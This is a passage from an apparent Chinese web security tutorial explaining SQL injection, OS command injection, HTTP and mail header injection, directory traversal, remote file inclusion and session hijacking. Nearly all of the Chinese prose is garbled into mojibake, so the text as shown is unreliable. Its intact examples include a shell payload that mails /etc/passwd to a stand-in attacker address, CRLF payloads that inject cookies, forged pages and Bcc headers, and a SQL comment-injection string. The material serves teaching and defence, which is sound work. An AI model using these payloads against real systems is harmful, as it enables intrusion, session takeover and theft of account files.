è€Œäº§ç”Ÿçš„æ”»å‡»ã€‚è¯¥å®‰å…¨éšæ‚£æœ‰å¯èƒ½å¼•å‘æžå¤§çš„å¨èƒï¼Œæœ‰æ—¶ä¼šç›´æŽ¥å¯¼è‡´ä¸ªäººä¿¡æ¯åŠæœºå¯†ä¿¡æ¯çš„æ³„éœ²ã€‚ Web åº”ç”¨é€šå¸¸éƒ½ä¼šç”¨åˆ°æ•°æ®åº“ï¼Œå½“éœ€è¦å¯¹æ•°æ®åº“è¡¨å†…çš„æ•°æ®è¿›è¡Œæ£€ç´¢æˆ–æ·»åŠ ã€åˆ é™¤ç­‰æ“ä½œæ—¶ï¼Œä¼šä½¿ç”¨ SQL è¯­å¥è¿žæŽ¥æ•°æ®åº“è¿›è¡Œç‰¹å®šçš„æ“ä½œã€‚å¦‚æžœåœ¨è°ƒç”¨ SQL è¯­å¥çš„æ–¹å¼ä¸Šå­˜åœ¨ç–æ¼ï¼Œå°±æœ‰å¯èƒ½æ‰§è¡Œè¢«æ¶æ„æ³¨å…¥ï¼ˆInjectionï¼‰éžæ³• SQL è¯­å¥ã€‚ SQL æ³¨å…¥æ”»å‡»æœ‰å¯èƒ½ä¼šé€ æˆä»¥ä¸‹ç­‰å½±å“ã€‚ éžæ³•æŸ¥çœ‹æˆ–ç¯¡æ”¹æ•°æ®åº“å†…çš„æ•°æ® è§„é¿è®¤è¯ æ‰§è¡Œå’Œæ•°æ®åº“æœåŠ¡å™¨ä¸šåŠ¡å…³è”çš„ç¨‹åºç­‰ ä½•ä¸º SQL SQL æ˜¯ç”¨æ¥æ“ä½œå…³ç³»åž‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRelational DataBaseManagement Systemï¼ŒRDBMSï¼‰çš„æ•°æ®åº“è¯­è¨€ï¼Œå¯è¿›è¡Œæ“ä½œæ•°æ®æˆ–å®šä¹‰æ•°æ®ç­‰ã€‚RDBMS ä¸­æœ‰åçš„æ•°æ®åº“æœ‰ Oracle Databaseã€Microsoft SQL Serverã€IBM DB2ã€MySQL å’Œ PostgreSQL ç­‰ã€‚è¿™äº›æ•°æ®åº“ç³»ç»Ÿéƒ½å¯ä»¥æŠŠ SQL ä½œä¸ºæ•°æ®åº“è¯­è¨€ä½¿ç”¨ã€‚ä½¿ç”¨æ•°æ®åº“çš„ Web åº”ç”¨ï¼Œé€šè¿‡æŸç§æ–¹æ³•å°† SQL è¯­å¥ä¼ ç»™RDBMSï¼Œå†æŠŠ RDBMS è¿”å›žçš„ç»“æžœçµæ´»åœ°ä½¿ç”¨åœ¨ Web åº”ç”¨ä¸­ã€‚ 1SELECT title,text FROM newsTbl WHERE id=123 SQL æ³¨å…¥æ”»å‡»æ¡ˆä¾‹ URL çš„æŸ¥è¯¢å­—æ®µå·²æŒ‡å®š q= ä¸Šé‡Žå®£ï¼Œè¿™ä¸ªå€¼ç”± Web åº”ç”¨ä¼ å…¥åˆ°SQL è¯­å¥ä¸­ï¼Œæž„æˆä¸‹æ–¹çš„ SQL è¯­å¥ã€‚ 1SELECT * FROM bookTbl WHERE author = 'ä¸Šé‡Žå®£' and flag = 1; è¯¥ SQL è¯­å¥è¡¨ç¤ºâ€œä»Ž bookTbl è¡¨ä¸­ï¼Œæ˜¾ç¤ºæ»¡è¶³ author= ä¸Šé‡Žå®£ and flag=1ï¼ˆå¯å”®ï¼‰æ‰€åœ¨è¡Œçš„æ•°æ®â€ã€‚æ•°æ®åº“å†…çš„ bookTbl è¡¨è®°å½•ç€è¯¥è´­ç‰©ç½‘ç«™çš„æ‰€æœ‰ä¹¦ç±ä¿¡æ¯ã€‚é€šè¿‡SQL è¯­å¥ï¼Œå°†æ»¡è¶³ä½œè€…åï¼ˆauthorï¼‰ä¸Šé‡Žå®£å¹¶ä¸” flag ä¸º 1 åŒé‡æ¡ä»¶çš„æ¡ç›®å–å‡ºï¼Œæœ€åŽä½œä¸ºæœç´¢ç»“æžœæ˜¾ç¤ºå‡ºæ¥ å¦‚æžœæŠŠä¸Šé‡Žå®£æ”¹å†™æˆâ€œä¸Šé‡Žå®£â€™â€“â€ã€‚ æž„æˆçš„ SQL è¯­å¥å°±å˜æˆâ€œä»Žæ•°æ®åº“çš„ bookTbl è¡¨ä¸­ï¼Œæ˜¾ç¤ºæ»¡è¶³author= ä¸Šé‡Žå®£æ¡ä»¶æ‰€åœ¨è¡Œçš„æ•°æ®â€ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 1SELECT * FROM bookTbl WHERE author ='ä¸Šé‡Žå®£' - -' and flag=1; SQL è¯­å¥ä¸­çš„ â€“ ä¹‹åŽå…¨è§†ä¸ºæ³¨é‡Šã€‚å³ï¼Œand flag=1 è¿™ä¸ªæ¡ä»¶è¢«è‡ªåŠ¨å¿½ç•¥äº†ã€‚ ç»“æžœè·Ÿ flag çš„è®¾å®šå€¼æ— å…³ï¼Œåªå–å‡ºæ»¡è¶³ author=â€œä¸Šé‡Žå®£â€æ¡ä»¶æ‰€åœ¨è¡Œçš„æ•°æ®ï¼Œè¿™æ ·è¿žé‚£äº›å°šæœªå‡ºç‰ˆçš„ä¹¦ç±ä¹Ÿä¸€å¹¶æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ æœ¬æ¡ˆä¾‹ä¸­çš„é—®é¢˜ä»…ä»…æ˜¯æŠŠæœªå‡ºç‰ˆä¹¦ç±çš„æ¡ç›®ä¹Ÿä¸€åŒæ˜¾ç¤ºå‡ºæ¥äº†ã€‚ä½†å®žé™…å‘ç”Ÿ SQL æ³¨å…¥æ”»å‡»æ—¶ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æˆ–ç»“ç®—å†…å®¹ç­‰å…¶ä»–æ•°æ®è¡¨çš„éžæ³•æµè§ˆåŠç¯¡æ”¹ï¼Œä»Žè€Œä½¿ç”¨æˆ·é­å—ä¸åŒç¨‹åº¦çš„æŸå¤±ã€‚ OS å‘½ä»¤æ³¨å…¥æ”»å‡»OS å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼ˆOS Command Injectionï¼‰æ˜¯æŒ‡é€šè¿‡ Web åº”ç”¨ï¼Œæ‰§è¡Œéžæ³•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚åªè¦åœ¨èƒ½è°ƒç”¨ Shell å‡½æ•°çš„åœ°æ–¹å°±æœ‰å­˜åœ¨è¢«æ”»å‡»çš„é£Žé™©ã€‚ å¯ä»¥ä»Ž Web åº”ç”¨ä¸­é€šè¿‡ Shell æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚å€˜è‹¥è°ƒç”¨ Shellæ—¶å­˜åœ¨ç–æ¼ï¼Œå°±å¯ä»¥æ‰§è¡Œæ’å…¥çš„éžæ³• OS å‘½ä»¤ã€‚ OS å‘½ä»¤æ³¨å…¥æ”»å‡»å¯ä»¥å‘ Shell å‘é€å‘½ä»¤ï¼Œè®© Windows æˆ– Linux æ“ä½œç³»ç»Ÿçš„å‘½ä»¤è¡Œå¯åŠ¨ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ OS æ³¨å…¥æ”»å‡»å¯æ‰§è¡Œ OS ä¸Šå®‰è£…ç€çš„å„ç§ç¨‹åºã€‚ OS æ³¨å…¥æ”»å‡»æ¡ˆä¾‹ ä¸‹é¢ä»¥å’¨è¯¢è¡¨å•çš„å‘é€åŠŸèƒ½ä¸ºä¾‹ï¼Œè®²è§£ OS æ³¨å…¥æ”»å‡»ã€‚è¯¥åŠŸèƒ½å¯å°†ç”¨æˆ·çš„å’¨è¯¢é‚®ä»¶æŒ‰å·²å¡«å†™çš„å¯¹æ–¹é‚®ç®±åœ°å€å‘é€è¿‡åŽ»ã€‚ ä¸‹é¢æ‘˜é€‰å¤„ç†è¯¥è¡¨å•å†…å®¹çš„ä¸€éƒ¨åˆ†æ ¸å¿ƒä»£ç ã€‚ 123my $adr = $q-&gt;param('mailaddress');open(MAIL, "| /usr/sbin/sendmail $adr");print MAIL "From: info@example.com\n"; ç¨‹åºä¸­çš„ open å‡½æ•°ä¼šè°ƒç”¨ sendmail å‘½ä»¤å‘é€é‚®ä»¶ï¼Œè€ŒæŒ‡å®šçš„é‚®ä»¶å‘é€åœ°å€å³ $adr çš„å€¼ã€‚æ”»å‡»è€…å°†ä¸‹é¢çš„å€¼æŒ‡å®šä½œä¸ºé‚®ä»¶åœ°å€ã€‚ 1; cat /etc/passwd | mail hack@example.jp ç¨‹åºæŽ¥æ”¶è¯¥å€¼ï¼Œæž„æˆä»¥ä¸‹çš„å‘½ä»¤ç»„åˆã€‚ 1| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp æ”»å‡»è€…çš„è¾“å…¥å€¼ä¸­å«æœ‰åˆ†å·ï¼ˆ;ï¼‰ã€‚è¿™ä¸ªç¬¦å·åœ¨ OS å‘½ä»¤ä¸­ï¼Œä¼šè¢«è§£æžä¸ºåˆ†éš”å¤šä¸ªæ‰§è¡Œå‘½ä»¤çš„æ ‡è®°ã€‚ å¯è§ï¼Œsendmail å‘½ä»¤æ‰§è¡Œè¢«åˆ†éš”åŽï¼ŒæŽ¥ä¸‹åŽ»å°±ä¼šæ‰§è¡Œ cat/etc/passwd | mail hack@example.jp è¿™æ ·çš„å‘½ä»¤äº†ã€‚ç»“æžœï¼Œå«æœ‰ Linux è´¦æˆ·ä¿¡æ¯ /etc/passwd çš„æ–‡ä»¶ï¼Œå°±ä»¥é‚®ä»¶å½¢å¼å‘é€ç»™äº† hack@example.jpã€‚ HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP Header Injectionï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡åœ¨å“åº”é¦–éƒ¨å­—æ®µå†…æ’å…¥æ¢è¡Œï¼Œæ·»åŠ ä»»æ„å“åº”é¦–éƒ¨æˆ–ä¸»ä½“çš„ä¸€ç§æ”»å‡»ã€‚å±žäºŽè¢«åŠ¨æ”»å‡»æ¨¡å¼ã€‚ å‘é¦–éƒ¨ä¸»ä½“å†…æ·»åŠ å†…å®¹çš„æ”»å‡»ç§°ä¸º HTTP å“åº”æˆªæ–­æ”»å‡»ï¼ˆHTTP Response Splitting Attackï¼‰ã€‚ å¦‚ä¸‹æ‰€ç¤ºï¼ŒWeb åº”ç”¨æœ‰æ—¶ä¼šæŠŠä»Žå¤–éƒ¨æŽ¥æ”¶åˆ°çš„æ•°å€¼ï¼Œèµ‹ç»™å“åº”é¦–éƒ¨å­—æ®µ Location å’Œ Set-Cookieã€‚ 123Location: http://www.example.com/a.cgi?q=12345Set-Cookie: UID=12345ï¼Š12345å°±æ˜¯æ’å…¥å€¼ HTTP é¦–éƒ¨æ³¨å…¥å¯èƒ½åƒè¿™æ ·ï¼Œé€šè¿‡åœ¨æŸäº›å“åº”é¦–éƒ¨å­—æ®µéœ€è¦å¤„ç†è¾“å‡ºå€¼çš„åœ°æ–¹ï¼Œæ’å…¥æ¢è¡Œå‘åŠ¨æ”»å‡»ã€‚ HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»æœ‰å¯èƒ½ä¼šé€ æˆä»¥ä¸‹ä¸€äº›å½±å“ã€‚ è®¾ç½®ä»»ä½• Cookie ä¿¡æ¯ é‡å®šå‘è‡³ä»»æ„ URL æ˜¾ç¤ºä»»æ„çš„ä¸»ä½“ï¼ˆHTTP å“åº”æˆªæ–­æ”»å‡»ï¼‰ HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»æ¡ˆä¾‹ ä¸‹é¢æˆ‘ä»¬ä»¥é€‰å®šæŸä¸ªç±»åˆ«åŽå³å¯è·³è½¬è‡³å„ç±»åˆ«å¯¹åº”é¡µé¢çš„åŠŸèƒ½ä¸ºä¾‹ï¼Œè®²è§£ HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»ã€‚è¯¥åŠŸèƒ½ä¸ºæ¯ä¸ªç±»åˆ«éƒ½è®¾å®šäº†ä¸€ä¸ªç±»åˆ« ID å€¼ï¼Œä¸€æ—¦é€‰å®šæŸç±»åˆ«ï¼Œå°±ä¼šå°†è¯¥ ID å€¼åæ˜ åœ¨å“åº”å†…çš„Location é¦–éƒ¨å­—æ®µå†…ï¼Œå½¢å¦‚ Location: http://example.com/?cat=101ã€‚ä»¤æµè§ˆå™¨å‘ç”Ÿé‡å®šå‘è·³è½¬ã€‚ æ”»å‡»è€…ä»¥ä¸‹é¢çš„å†…å®¹æ›¿ä»£ä¹‹å‰çš„ç±»åˆ« ID åŽå‘é€è¯·æ±‚ã€‚ 1101%0D%0ASet-Cookie:+SID=123456789 å…¶ä¸­ï¼Œ%0D%0A ä»£è¡¨ HTTP æŠ¥æ–‡ä¸­çš„æ¢è¡Œç¬¦ï¼Œç´§æŽ¥ç€çš„æ˜¯å¯å¼ºåˆ¶å°†æ”»å‡»è€…ç½‘ç«™ï¼ˆhttp://hackr.jp/ï¼‰çš„ä¼šè¯ ID è®¾ç½®æˆ SID=123456789 çš„ Set-Cookie é¦–éƒ¨å­—æ®µã€‚ å‘é€è¯¥è¯·æ±‚ä¹‹åŽï¼Œå‡è®¾ç»“æžœè¿”å›žä»¥ä¸‹å“åº”ã€‚ 12Location: http://example.com/?cat=101ï¼ˆ%0D%0A ï¼šæ¢è¡Œç¬¦ï¼‰Set-Cookie: SID=123456789 æ­¤åˆ»ï¼Œé¦–éƒ¨å­—æ®µ Set-Cookie å·²ç”Ÿæ•ˆï¼Œå› æ­¤æ”»å‡»è€…å¯æŒ‡å®šä¿®æ”¹ä»»æ„çš„ Cookie ä¿¡æ¯ã€‚é€šè¿‡å’Œä¼šè¯å›ºå®šæ”»å‡»ï¼ˆæ”»å‡»è€…å¯ä½¿ç”¨æŒ‡å®šçš„ä¼šè¯ IDï¼‰æ”»å‡»ç»„åˆï¼Œæ”»å‡»è€…å¯ä¼ªè£…æˆç”¨æˆ·ã€‚ æ”»å‡»è€…è¾“å…¥çš„ %0D%0Aï¼ŒåŽŸæœ¬åº”è¯¥å±žäºŽé¦–éƒ¨å­—æ®µ Location çš„æŸ¥è¯¢å€¼éƒ¨åˆ†ï¼Œä½†ç»è¿‡è§£æžåŽï¼Œ%0D%0A å˜æˆäº†æ¢è¡Œç¬¦ï¼Œç»“æžœæ’å…¥äº†æ–°çš„é¦–éƒ¨å­—æ®µã€‚è¿™æ ·ä¸€æ¥ï¼Œæ”»å‡»è€…å¯åœ¨å“åº”ä¸­æ’å…¥ä»»æ„çš„é¦–éƒ¨å­—æ®µã€‚ HTTP å“åº”æˆªæ–­æ”»å‡» HTTP å“åº”æˆªæ–­æ”»å‡»æ˜¯ç”¨åœ¨ HTTP é¦–éƒ¨æ³¨å…¥çš„ä¸€ç§æ”»å‡»ã€‚æ”»å‡»é¡ºåºç›¸åŒï¼Œä½†æ˜¯è¦å°†ä¸¤ä¸ª %0D%0A%0D%0A å¹¶æŽ’æ’å…¥å­—ç¬¦ä¸²åŽå‘é€ã€‚åˆ©ç”¨è¿™ä¸¤ä¸ªè¿žç»­çš„æ¢è¡Œå°±å¯ä½œå‡º HTTP é¦–éƒ¨ä¸Žä¸»ä½“åˆ†éš”æ‰€éœ€çš„ç©ºè¡Œäº†ï¼Œè¿™æ ·å°±èƒ½æ˜¾ç¤ºä¼ªé€ çš„ä¸»ä½“ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è¿™æ ·çš„æ”»å‡»å«åš HTTP å“åº”æˆªæ–­æ”»å‡»ã€‚ 1%0D%0A%0D%0A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;ä¹‹åŽï¼Œæƒ³è¦æ˜¾ç¤ºçš„ç½‘é¡µå†…å®¹ &lt;!--ï¼ˆåŽŸæ¥é¡µé¢å¯¹åº”çš„é¦–éƒ¨å­—æ®µ) --&gt; åœ¨å¯èƒ½è¿›è¡Œ HTTP é¦–éƒ¨æ³¨å…¥çš„çŽ¯èŠ‚ï¼Œé€šè¿‡å‘é€ä¸Šé¢çš„å­—ç¬¦ä¸²ï¼Œè¿”å›žç»“æžœå¾—åˆ°ä»¥ä¸‹è¿™ç§å“åº”ã€‚ 123Set-Cookie: UID=ï¼ˆ%0D%0A ï¼šæ¢è¡Œç¬¦ï¼‰ï¼ˆ%0D%0A ï¼šæ¢è¡Œç¬¦ï¼‰&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;ä¹‹åŽï¼Œæƒ³è¦æ˜¾ç¤ºçš„ç½‘é¡µå†…å®¹ &lt;!--ï¼ˆåŽŸæ¥é¡µé¢å¯¹åº”çš„é¦–éƒ¨å­—æ®µ)--&gt; åˆ©ç”¨è¿™ä¸ªæ”»å‡»ï¼Œå·²è§¦å‘é™·é˜±çš„ç”¨æˆ·æµè§ˆå™¨ä¼šæ˜¾ç¤ºä¼ªé€ çš„ Web é¡µé¢ï¼Œå†è®©ç”¨æˆ·è¾“å…¥è‡ªå·±çš„ä¸ªäººä¿¡æ¯ç­‰ï¼Œå¯è¾¾åˆ°å’Œè·¨ç«™è„šæœ¬æ”»å‡»ç›¸åŒçš„æ•ˆæžœã€‚ å¦å¤–ï¼Œæ»¥ç”¨ HTTP/1.1 ä¸­æ±‡é›†å¤šå“åº”è¿”å›žåŠŸèƒ½ï¼Œä¼šå¯¼è‡´ç¼“å­˜æœåŠ¡å™¨å¯¹ä»»æ„å†…å®¹è¿›è¡Œç¼“å­˜æ“ä½œã€‚è¿™ç§æ”»å‡»ç§°ä¸ºç¼“å­˜æ±¡æŸ“ã€‚ä½¿ç”¨è¯¥ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·ï¼Œåœ¨æµè§ˆé­å—æ”»å‡»çš„ç½‘ç«™æ—¶ï¼Œä¼šä¸æ–­åœ°æµè§ˆè¢«æ›¿æ¢æŽ‰çš„ Web ç½‘é¡µã€‚ é‚®ä»¶é¦–éƒ¨æ³¨å…¥æ”»å‡»é‚®ä»¶é¦–éƒ¨æ³¨å…¥ï¼ˆMail Header Injectionï¼‰æ˜¯æŒ‡ Web åº”ç”¨ä¸­çš„é‚®ä»¶å‘é€åŠŸèƒ½ï¼Œæ”»å‡»è€…é€šè¿‡å‘é‚®ä»¶é¦–éƒ¨ To æˆ– Subject å†…ä»»æ„æ·»åŠ éžæ³•å†…å®¹å‘èµ·çš„æ”»å‡»ã€‚åˆ©ç”¨å­˜åœ¨å®‰å…¨æ¼æ´žçš„ Web ç½‘ç«™ï¼Œå¯å¯¹ä»»æ„é‚®ä»¶åœ°å€å‘é€å¹¿å‘Šé‚®ä»¶æˆ–ç—…æ¯’é‚®ä»¶ã€‚ æ”»å‡»è€…å°†ä»¥ä¸‹æ•°æ®ä½œä¸ºé‚®ä»¶åœ°å€å‘èµ·è¯·æ±‚ã€‚ 1bob@hackr.jp%0D%0ABcc: user@example.com %0D%0A åœ¨é‚®ä»¶æŠ¥æ–‡ä¸­ä»£è¡¨æ¢è¡Œç¬¦ã€‚ä¸€æ—¦å’¨è¯¢è¡¨å•æ‰€åœ¨çš„ Webåº”ç”¨æŽ¥æ”¶äº†è¿™ä¸ªæ¢è¡Œç¬¦ï¼Œå°±å¯èƒ½å®žçŽ°å¯¹ Bcc é‚®ä»¶åœ°å€çš„è¿½åŠ å‘é€ï¼Œè€Œè¿™åŽŸæœ¬æ˜¯æ— æ³•æŒ‡å®šçš„ã€‚å¦å¤–åƒä¸‹é¢ä¸€æ ·ï¼Œä½¿ç”¨ä¸¤ä¸ªè¿žç»­çš„æ¢è¡Œç¬¦å°±æœ‰å¯èƒ½ç¯¡æ”¹é‚®ä»¶æ–‡æœ¬å†…å®¹å¹¶å‘é€ã€‚ 1bob@hackr.jp%0D%0A%0D%0ATest Message å†ä»¥ç›¸åŒçš„æ–¹æ³•ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™ To å’Œ Subject ç­‰ä»»æ„é‚®ä»¶é¦–éƒ¨ï¼Œæˆ–å‘æ–‡æœ¬æ·»åŠ é™„ä»¶ç­‰åŠ¨ä½œã€‚ ç›®å½•éåŽ†æ”»å‡»ç›®å½•éåŽ†ï¼ˆDirectory Traversalï¼‰æ”»å‡»æ˜¯æŒ‡å¯¹æœ¬æ— æ„å…¬å¼€çš„æ–‡ä»¶ç›®å½•ï¼Œé€šè¿‡éžæ³•æˆªæ–­å…¶ç›®å½•è·¯å¾„åŽï¼Œè¾¾æˆè®¿é—®ç›®çš„çš„ä¸€ç§æ”»å‡»ã€‚è¿™ç§æ”»å‡»æœ‰æ—¶ä¹Ÿç§°ä¸ºè·¯å¾„éåŽ†ï¼ˆPath Traversalï¼‰æ”»å‡»ã€‚ é€šè¿‡ Web åº”ç”¨å¯¹æ–‡ä»¶å¤„ç†æ“ä½œæ—¶ï¼Œåœ¨ç”±å¤–éƒ¨æŒ‡å®šæ–‡ä»¶åçš„å¤„ç†å­˜åœ¨ç–æ¼çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä½¿ç”¨ â€¦/ ç­‰ç›¸å¯¹è·¯å¾„å®šä½åˆ° /etc/passed ç­‰ç»å¯¹è·¯å¾„ä¸Šï¼Œå› æ­¤æœåŠ¡å™¨ä¸Šä»»æ„çš„æ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•çš†æœ‰å¯èƒ½è¢«è®¿é—®åˆ°ã€‚è¿™æ ·ä¸€æ¥ï¼Œå°±æœ‰å¯èƒ½éžæ³•æµè§ˆã€ç¯¡æ”¹æˆ–åˆ é™¤ Web æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žï¼ˆRemote File Inclusionï¼‰æ˜¯æŒ‡å½“éƒ¨åˆ†è„šæœ¬å†…å®¹éœ€è¦ä»Žå…¶ä»–æ–‡ä»¶è¯»å…¥æ—¶ï¼Œæ”»å‡»è€…åˆ©ç”¨æŒ‡å®šå¤–éƒ¨æœåŠ¡å™¨çš„ URL å……å½“ä¾èµ–æ–‡ä»¶ï¼Œè®©è„šæœ¬è¯»å–ä¹‹åŽï¼Œå°±å¯è¿è¡Œä»»æ„è„šæœ¬çš„ä¸€ç§æ”»å‡»ã€‚ è¿™ä¸»è¦æ˜¯ PHP å­˜åœ¨çš„å®‰å…¨æ¼æ´žï¼Œå¯¹ PHP çš„ include æˆ– require æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§å¯é€šè¿‡è®¾å®šï¼ŒæŒ‡å®šå¤–éƒ¨æœåŠ¡å™¨çš„ URL ä½œä¸ºæ–‡ä»¶åçš„åŠŸèƒ½ã€‚ä½†æ˜¯ï¼Œè¯¥åŠŸèƒ½å¤ªå±é™©ï¼ŒPHP5.2.0 ä¹‹åŽé»˜è®¤è®¾å®šæ­¤åŠŸèƒ½æ— æ•ˆã€‚å›ºç„¶å­˜åœ¨è¾“å‡ºå€¼è½¬ä¹‰çš„é—®é¢˜ï¼Œä½†æ›´åº”æŽ§åˆ¶å¯¹ä»»æ„æ–‡ä»¶åçš„æŒ‡å®šã€‚ å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼æ´žæ˜¯æŒ‡ï¼Œé”™è¯¯è®¾ç½® Web æœåŠ¡å™¨ï¼Œæˆ–æ˜¯ç”±è®¾è®¡ä¸Šçš„ä¸€äº›é—®é¢˜å¼•èµ·çš„å®‰å…¨æ¼æ´žã€‚ å¼ºåˆ¶æµè§ˆå¼ºåˆ¶æµè§ˆï¼ˆForced Browsingï¼‰å®‰å…¨æ¼æ´žæ˜¯æŒ‡ï¼Œä»Žå®‰ç½®åœ¨ Web æœåŠ¡å™¨çš„å…¬å¼€ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­ï¼Œæµè§ˆé‚£äº›åŽŸæœ¬éžè‡ªæ„¿å…¬å¼€çš„æ–‡ä»¶ã€‚ å¼ºåˆ¶æµè§ˆæœ‰å¯èƒ½ä¼šé€ æˆä»¥ä¸‹ä¸€äº›å½±å“ã€‚ æ³„éœ²é¡¾å®¢çš„ä¸ªäººä¿¡æ¯ç­‰é‡è¦æƒ…æŠ¥ æ³„éœ²åŽŸæœ¬éœ€è¦å…·æœ‰è®¿é—®æƒé™çš„ç”¨æˆ·æ‰å¯æŸ¥é˜…çš„ä¿¡æ¯å†…å®¹ æ³„éœ²æœªå¤–è¿žåˆ°å¤–ç•Œçš„æ–‡ä»¶ å¯¹é‚£äº›åŽŸæœ¬ä¸æ„¿å…¬å¼€çš„æ–‡ä»¶ï¼Œä¸ºäº†ä¿è¯å®‰å…¨ä¼šéšè”½å…¶ URLã€‚å¯ä¸€æ—¦çŸ¥é“äº†é‚£äº› URLï¼Œä¹Ÿå°±æ„å‘³ç€å¯æµè§ˆ URL å¯¹åº”çš„æ–‡ä»¶ã€‚ç›´æŽ¥æ˜¾ç¤ºå®¹æ˜“æŽ¨æµ‹çš„æ–‡ä»¶åæˆ–æ–‡ä»¶ç›®å½•ç´¢å¼•æ—¶ï¼Œé€šè¿‡æŸäº›æ–¹æ³•å¯èƒ½ä¼šä½¿ URL äº§ç”Ÿæ³„éœ²ã€‚ ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError Handling Vulnerabilityï¼‰çš„å®‰å…¨æ¼æ´žæ˜¯æŒ‡ï¼ŒWeb åº”ç”¨çš„é”™è¯¯ä¿¡æ¯å†…åŒ…å«å¯¹æ”»å‡»è€…æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä¸Ž Web åº”ç”¨æœ‰å…³çš„ä¸»è¦é”™è¯¯ä¿¡æ¯å¦‚ä¸‹æ‰€ç¤ºã€‚ Web åº”ç”¨æŠ›å‡ºçš„é”™è¯¯æ¶ˆæ¯ æ•°æ®åº“ç­‰ç³»ç»ŸæŠ›å‡ºçš„é”™è¯¯æ¶ˆæ¯ Web åº”ç”¨ä¸å¿…åœ¨ç”¨æˆ·çš„æµè§ˆç”»é¢ä¸Šå±•çŽ°è¯¦ç»†çš„é”™è¯¯æ¶ˆæ¯ã€‚å¯¹æ”»å‡»è€…æ¥è¯´ï¼Œè¯¦ç»†çš„é”™è¯¯æ¶ˆæ¯æœ‰å¯èƒ½ç»™ä»–ä»¬ä¸‹ä¸€æ¬¡æ”»å‡»ä»¥æç¤ºã€‚ å¼€æ”¾é‡å®šå‘å¼€æ”¾é‡å®šå‘ï¼ˆOpen Redirectï¼‰æ˜¯ä¸€ç§å¯¹æŒ‡å®šçš„ä»»æ„ URL ä½œé‡å®šå‘è·³è½¬çš„åŠŸèƒ½ã€‚è€ŒäºŽæ­¤åŠŸèƒ½ç›¸å…³è”çš„å®‰å…¨æ¼æ´žæ˜¯æŒ‡ï¼Œå‡å¦‚æŒ‡å®šçš„é‡å®šå‘ URLåˆ°æŸä¸ªå…·æœ‰æ¶æ„çš„ Web ç½‘ç«™ï¼Œé‚£ä¹ˆç”¨æˆ·å°±ä¼šè¢«è¯±å¯¼è‡³é‚£ä¸ª Web ç½‘ç«™ã€‚ å› ä¼šè¯ç®¡ç†ç–å¿½å¼•å‘çš„å®‰å…¨æ¼æ´žä¼šè¯ç®¡ç†æ˜¯ç”¨æ¥ç®¡ç†ç”¨æˆ·çŠ¶æ€çš„å¿…å¤‡åŠŸèƒ½ï¼Œä½†æ˜¯å¦‚æžœåœ¨ä¼šè¯ç®¡ç†ä¸Šæœ‰æ‰€ç–å¿½ï¼Œå°±ä¼šå¯¼è‡´ç”¨æˆ·çš„è®¤è¯çŠ¶æ€è¢«çªƒå–ç­‰åŽæžœã€‚ ä¼šè¯åŠ«æŒä¼šè¯åŠ«æŒï¼ˆSession Hijackï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æŸç§æ‰‹æ®µæ‹¿åˆ°äº†ç”¨æˆ·çš„ä¼šè¯ IDï¼Œå¹¶éžæ³•ä½¿ç”¨æ­¤ä¼šè¯ ID ä¼ªè£…æˆç”¨æˆ·ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ å…·å¤‡è®¤è¯åŠŸèƒ½çš„ Web åº”ç”¨ï¼Œä½¿ç”¨ä¼šè¯ ID çš„ä¼šè¯ç®¡ç†æœºåˆ¶ï¼Œä½œä¸ºç®¡ç†è®¤è¯çŠ¶æ€çš„ä¸»æµæ–¹å¼ã€‚ä¼šè¯ ID ä¸­è®°å½•å®¢æˆ·ç«¯çš„ Cookie ç­‰ä¿¡æ¯ï¼ŒæœåŠ¡å™¨ç«¯å°†ä¼šè¯ ID ä¸Žè®¤è¯çŠ¶æ€è¿›è¡Œä¸€å¯¹ä¸€åŒ¹é…ç®¡ç†ã€‚ ä¸‹é¢åˆ—ä¸¾äº†å‡ ç§æ”»å‡»è€…å¯èŽ·å¾—ä¼šè¯ ID çš„é€”å¾„ã€‚ é€šè¿‡éžæ­£è§„çš„ç”Ÿæˆæ–¹æ³•æŽ¨æµ‹ä¼šè¯ ID é€šè¿‡çªƒå¬æˆ– XSS æ”»å‡»ç›—å–ä¼šè¯ ID é€šè¿‡ä¼šè¯å›ºå®šæ”»å‡»ï¼ˆSession Fixationï¼‰å¼ºè¡ŒèŽ·å–ä¼šè¯ ID 